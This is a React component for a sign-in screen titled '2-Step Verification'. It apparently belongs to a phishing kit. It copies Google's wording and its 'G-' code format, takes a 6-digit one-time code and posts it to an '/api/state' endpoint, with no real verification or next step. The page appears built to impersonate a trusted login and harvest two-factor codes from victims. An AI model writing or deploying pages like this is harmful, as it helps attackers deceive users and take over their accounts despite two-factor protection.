"use client";

import { useForm, type SubmitHandler } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";

const otpSchema = z.object({
  otp: z.string().min(6, "Enter a 6-digit code").max(6, "Enter a 6-digit code"),
});
type OtpFormData = z.infer<typeof otpSchema>;

export default function OtpStep() {
  const { register, handleSubmit, formState: { errors, isSubmitting } } = useForm<OtpFormData>({
    resolver: zodResolver(otpSchema),
  });
  const { toast } = useToast();

  const onSubmit: SubmitHandler<OtpFormData> = async (data) => {
    try {
      const res = await fetch("/api/state", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action: "submitOtp", otp: data.otp }),
      });
      if (!res.ok) throw new Error("Server responded with an error.");
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Error",
        description: "Could not verify. Please try again.",
      });
    }
  };

  return (
    <div className="w-full">
      <h1 className="text-2xl font-normal">2-Step Verification</h1>
      <p className="mt-4 text-sm text-left">
        This extra step shows it’s really you trying to sign in.
      </p>
      <p className="mt-4 text-sm text-left text-muted-foreground">
        Enter the 6-digit code sent to your device.
      </p>
      
      <form onSubmit={handleSubmit(onSubmit)} className="mt-8 space-y-6">
        <div className="relative">
          <Input
            id="otp"
            type="tel"
            placeholder="G-______"
            {...register("otp")}
            className="h-14 pt-2 text-base tracking-[.5em]"
            maxLength={6}
          />
          {errors.otp && <p className="text-sm text-destructive mt-1 px-1">{errors.otp.message}</p>}
        </div>
        
        <div className="flex justify-end items-center gap-4 pt-4">
          <Button variant="ghost" className="text-primary font-semibold">Try another way</Button>
          <Button type="submit" disabled={isSubmitting}>
            {isSubmitting ? "Verifying..." : "Next"}
          </Button>
        </div>
      </form>
    </div>
  );
}
